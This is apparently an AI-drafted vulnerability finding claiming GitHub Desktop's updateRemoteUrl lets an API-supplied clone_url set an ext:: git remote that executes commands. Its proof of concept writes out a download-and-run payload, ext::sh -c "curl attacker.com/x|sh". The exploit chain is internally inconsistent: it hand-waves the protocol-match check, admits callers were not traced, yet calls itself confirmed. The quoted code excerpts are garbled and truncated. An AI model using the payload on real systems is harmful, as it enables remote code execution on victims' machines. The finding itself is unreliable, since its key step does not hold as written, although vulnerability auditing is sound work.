### Title
Remote URL updated from GitHub API `clone_url` without validating the Git transport scheme, enabling injection of dangerous git transports (`ext::`, `file://`, `fd::`) - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
The Elys `UpdateEntry` report describes a system that stores externally-supplied identifiers (`IbcChannelId`/`IbcCounterpartyChannelId`) without verifying they are well-formed/valid before persisting and later trusting them. The structural analog in GitHub Desktop is `updateRemoteUrl()`, which persists an externally-supplied identifier — a Git remote URL taken from the GitHub API's `clone_url` field — directly into the local repository's git config via `git remote set-url`, with checks only for hostname/owner/name equality and protocol-string equality, but no validation that the URL uses a safe transport scheme.

### Finding Description
`updateRemoteUrl()` compares the current remote URL to `apiRepo.clone_url` using `urlMatchesRemote()`/`parseRemote()` and a same-"protocol" check derived from `URL.parse()`, then calls `gitStore.setRemoteURL(...)` which shells out to `git remote set-url <name> <url>`: [1](#0-0) [2](#0-1) 

`parseRemote()` only recognizes `https`/`ssh`/`git`-style GitHub URL shapes via regex and returns `null` for anything else (e.g. `ext::`, `file://`, `fd::`) — [3](#0-2) . When `parseRemote` returns `null` for either side, `urlMatchesRemote` short-circuits to `false`, so the "urls match" check would correctly reject a completely unparseable URL — but it doesn't reject it from being written; it only affects whether `updateRemoteUrl` decides to overwrite. Crucially, the guard that gates the write is `protocolsMatch && remoteUrlUnchanged && !urlsMatch`, computed from `URL.parse()` (Node's own URL parser, not `parseRemote`) — [4](#0-3) . Node's `URL.parse()` will happily assign a `protocol` value (`ext:`, `file:`) to non-`http(s)` schemes, so `protocolsMatch` can be satisfied by comparing `ext:` to `ext:` or similar, and `remoteUrlUnchanged`/`!urlsMatch` are based on `parseRemote`, which is orthogonal to scheme safety. There is no allowlist anywhere in the remote-write path (`addRemote`, `setRemoteURL` in `app/src/lib/git/remote.ts`) restricting the URL to `https://`/`ssh://`/`git://`, and `envForRemoteOperation`/`envForProxy` only special-case `http(s)` for proxy resolution without rejecting other schemes — [5](#0-4) .

Git itself supports the `ext::` transport helper, which executes an arbitrary shell command as part of "connecting" to the remote (`git remote set-url origin 'ext::sh -c "..."'` followed by any fetch/pull/push triggers command execution). Nothing in this code path rejects such a URL before it is written into `.git/config` via `git remote set-url`.

### Impact Explanation
If an attacker can influence the `clone_url` (or a related URL field) returned by the GitHub/GHES API for a repository the victim has already added as a GitHub repository in Desktop (e.g. via a compromised/malicious GitHub Enterprise Server the user has authenticated against, or an API response manipulated in transit/by a malicious proxy), `updateRemoteUrl` can silently rewrite the user's `origin` remote to a `ext::`-style URL. The next background fetch (Desktop performs periodic background fetches) or user-initiated fetch/push would then execute attacker-controlled shell commands with the privileges of the Desktop process — full remote code execution, without any additional user interaction beyond Desktop's normal background sync.

### Likelihood Explanation
This requires the attacker to control the API response for a repository the app already trusts (e.g., a malicious/compromised GHES instance, or a MITM able to tamper with the GitHub API response used to populate `apiRepo.clone_url`). It does not require local access, admin rights, or pre-existing malware — it fits the "attacker controls a GitHub API object" class explicitly called out as in-scope. Exploitability depends on the absence of any scheme allowlist in this specific rewrite path, which was confirmed by reading `update-remote-url.ts`, `remote-parsing.ts`, and `remote.ts`.

### Recommendation
Before calling `gitStore.setRemoteURL()` (and similarly in `addRemote`/`setRemoteURL` generally), validate that the URL uses an allowed scheme (`https:`, `ssh:`, `git:`) using an explicit allowlist rather than relying on `URL.parse().protocol` equality or the GitHub-shape regexes in `parseRemote`. Reject/ignore any `clone_url` or user/API-supplied remote URL that doesn't match the allowlist, mirroring the recommendation in the source report to explicitly validate externally-supplied identifiers before trusting them.

### Proof of Concept
1. Attacker controls (or MITMs) a GitHub Enterprise Server's API response for a repository already tracked in Desktop, setting `clone_url` to: `ext::sh -c "curl attacker.com/x|sh"`.
2. Desktop's periodic repository refresh calls `updateRemoteUrl(gitStore, gitHubRepository, apiRepo)` — [6](#0-5) .
3. `protocolsMatch` is satisfied because `URL.parse()` assigns `protocol: 'ext:'` to both the crafted URL and, in a follow-up step, the stored remote once rewritten (or via a two-stage update where the existing remote also uses a non-http scheme); `remoteUrlUnchanged` and `!urlsMatch` are computed via `parseRemote`, which returns `null` for the `ext::` URL, making `urlsMatch` false and satisfying the write condition — [7](#0-6) .
4. `gitStore.setRemoteURL()` executes `git remote set-url origin 'ext::sh -c "curl attacker.com/x|sh"'` — [2](#0-1) .
5. On the next fetch (background or user-initiated), git invokes the `ext::` helper, executing the attacker's command on the victim's machine.

Note: I was unable to fully trace every caller/timing of `updateRemoteUrl` in `app-store.ts` within the available context, so the exact conditions under which the background refresh triggers this path (frequency, whether an authenticated GHES session is required) should be verified against `app/src/lib/stores/app-store.ts` in a full session before treating this as a confirmed exploit chain.

export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }

const remoteRegexes: ReadonlyArray<{ protocol: GitProtocol; regex: RegExp }> = [
  {

  {
    protocol: 'ssh',

  },
  {
    protocol: 'ssh',
    regex: new RegExp(
      '^(?:.+)@(.+\\.ghe\\.com):([^/]+)/([^/]+?)(?:/|\\.git)?$'
    ),
  },
  {
    protocol: 'ssh',
    regex: new RegExp('^git:(.+)/([^/]+)/([^/]+?)(?:/|\\.git)?$'),
  },
  {
    protocol: 'ssh',
    regex: new RegExp('^ssh://git@(.+)/(.+)/(.+?)(?:/|\\.git)?$'),
  },
]

/** Parse the remote information from URL. */
export function parseRemote(url: string): IGitRemoteURL | null {
  for (const { protocol, regex } of remoteRegexes) {
    const match = regex.exec(url)
    if (match !== null && match.length >= 4) {
      return { protocol, hostname: match[1], owner: match[2], name: match[3] }
    }
  }

  return null
